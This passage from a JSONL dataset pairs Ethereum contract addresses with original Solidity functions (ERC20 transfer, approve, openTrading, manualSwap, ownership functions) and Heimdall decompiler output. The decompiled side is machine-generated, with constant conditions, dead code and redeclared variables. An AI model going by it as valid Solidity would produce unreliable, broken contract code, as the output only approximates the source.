= arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x9BD1F6a85396380c6404408125229550a03Ecb22", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\\r\\n        return _balances[account];\\r\\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_h[var_a];\n        return storage_map_h[var_a];\n    }"}
{"contract_address": "0xe150ed6520Ef0F5269a82638f344541e22298E51", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\\n        return _balances[account];\\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x2cAA87192a72dA386D615C986479a7E600EFc46f", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x3b9aca00) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x3b9aca00;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x3b9aca00) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x3b9aca00;\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x3b9aca00) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x3b9aca00;\n                                emit MaxTxAmountUpdated(0x3b9aca00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xD077813f2e3C8a461d6a0c07F093257856319cA8", "original_solidity_code": "function allowance(address owner_, address spender) external view override returns (uint256) {\\r\\n      return _allowances[owner_][spender];\\r\\n    }", "heimdall_decompiled_code": "function allowance(address arg0, address arg1) public view returns (uint256) {\n        address var_a = address(arg0);\n        var_b = 0x05;\n        var_a = address(arg1);\n        address var_b = keccak256(var_a);\n        address var_c = storage_map_d[var_a];\n        return storage_map_d[var_a];\n    }"}
{"contract_address": "0xC0BA94337896c443b7728Dce84B0A750e290fbFd", "original_solidity_code": "function setTrading() external onlyOwner {\r\n        sellpercent = 650;\r\n        buypercent = 1000;\r\n        transferpercent = 100; \r\n         \r\n    }", "heimdall_decompiled_code": "function setTrading() public {\n        require(address(getOwner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_f = 0x028a;\n        store_g = 0x03e8;\n        store_h = 0x64;\n    }"}
{"contract_address": "0x5Dae130C98E4867Eb6721c48D2255F06f3E2a055", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_h / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_g = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_g));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require(!0x989680 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_g / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_g / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_n[var_f] = 0x989680;\n        var_a = 0x989680;\n        emit Approval(address(this), address(store_g / 0x01), 0x989680);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).{ value: 0 ether }Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                if (!0x09 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0x01) {\n                                            }\n                                            if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x1826BA7e52f6e4EffB63dA920bbEa0F3dbA8AF94", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a]);\n        store_e = 0x01000000000000000000000000000000000000000000 | (uint248(store_e));\n        require(!storage_map_b[var_a]);\n        require(!bytes1(store_e / 0x010000000000000000000000000000000000000000));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_d), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_d);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_d), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_d).code.length);\n        (bool success, bytes memory ret0) = address(store_d).{ value: var_m ether }Unresolved_791ac947(var_l); // call\n        store_e = uint248(store_e);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xaEAD18A6f788fb7460aDA9fDFf4C4Cd6Ba72dDBE", "original_solidity_code": "function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\\n        // The interface IDs are constants representing the first 4 bytes\\n        // of the XOR of all function selectors in the interface.\\n        // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)\\n        // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)\\n        return\\n            interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.\\n            interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.\\n            interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.\\n    }", "heimdall_decompiled_code": "function supportsInterface(bytes4 arg0) public pure returns (bool) {\n        require(arg0 == (uint32(arg0)));\n        require(uint32(arg0) == 0x01ffc9a700000000000000000000000000000000000000000000000000000000);\n        require(uint32(arg0) == 0x01ffc9a700000000000000000000000000000000000000000000000000000000);\n        require(uint32(arg0) == 0x01ffc9a700000000000000000000000000000000000000000000000000000000);\n        require(uint32(arg0) == 0x01ffc9a700000000000000000000000000000000000000000000000000000000);\n        uint32 var_a = !(!(uint32(arg0)) == 0x01ffc9a700000000000000000000000000000000000000000000000000000000);\n        return !(!(uint32(arg0)) == 0x01ffc9a700000000000000000000000000000000000000000000000000000000);\n        var_a = !(!(uint32(arg0)) == 0x2a55205a00000000000000000000000000000000000000000000000000000000);\n        return !(!(uint32(arg0)) == 0x2a55205a00000000000000000000000000000000000000000000000000000000);\n    }"}
{"contract_address": "0xEea644890623CdfBD648027cbf819A3C8e48C924", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        var_e = this.code[11481:11513];\n        var_e = var_e;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0xe1d694acc0BA97387ba1BA0Ed26437DD49f0ea05", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x916c9A0556A89B324b8f1724330a9165C93311A9", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x53BF9362f1eD90638B06392Bc01813f162Eb8766", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_h / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_g = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_g));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require(!0x3b9aca00 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_g / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_g / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_n[var_f] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), address(store_g / 0x01), 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).{ value: 0 ether }Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                if (!0x09 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0x01) {\n                                            }\n                                            if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x86612Df86F83dfD8E95d71E7766E1579Bf82BCab", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xd98dc523C0F1B811E415888b7349DB94842Dd75b", "original_solidity_code": "function name() external view override returns (string memory) {\\r\\n      return _name;\\r\\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        bytes1 var_a = 0x20 + (var_a + (0x20 * (((store_a & (((!bytes1(store_a)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) + 0x1f) / 0x20)));\n        bytes1 var_b = (store_a & (((!bytes1(store_a)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02;\n        if (!(store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02) {\n            if (0x1f < (store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02)) {\n                uint256 var_c = 0;\n                uint256 var_d = storage_map_b[var_c];\n                if ((var_a + 0x20) + (store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) > (0x20 + (var_a + 0x20))) {\n                    var_d = 0x20;\n                    bytes1 var_e = var_a.length;\n                    if (!var_a.length) {\n                        bytes1 var_f = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g);\n                        return abi.encodePacked(0x20, var_a.length, (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g));\n                        return abi.encodePacked(0x20, var_a.length);\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x014dC23230Ac33983E2163FAd9bEA81635b3Dd34", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xf14bcFb9213C0583632d65e80ac5B2Bd02c7D3d8", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (!(store_c) == ((store_c / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_c / 0x02;\n                if (store_c) {\n                    if (!(store_c) == ((store_c / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c / 0x02) {\n                            if (0x1f < (store_c / 0x02)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x2C6C4c106F423c1C25932c474Abb356e8BBa8cC7", "original_solidity_code": "function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);\\n\\n    /**\\n     * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.\\n     * Use along with {totalSupply}", "heimdall_decompiled_code": "function tokenOfOwnerByIndex(address arg0, uint256 arg1) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        require(address(arg0), \"ERC721Enumerable: owner index out of bounds\");\n        address var_a = address(arg0);\n        var_b = 0x03;\n        require(arg1 < storage_map_b[var_a], \"ERC721Enumerable: owner index out of bounds\");\n        var_a = address(arg0);\n        var_b = 0x06;\n        var_a = arg1;\n        address var_b = keccak256(var_a);\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2b;\n        var_f = 0x455243373231456e756d657261626c653a206f776e657220696e646578206f75;\n        var_g = 0x74206f6620626f756e6473000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x4552433732313a2061646472657373207a65726f206973206e6f742061207661;\n        var_g = 0x6c6964206f776e65720000000000000000000000000000000000000000000000;\n    }"}
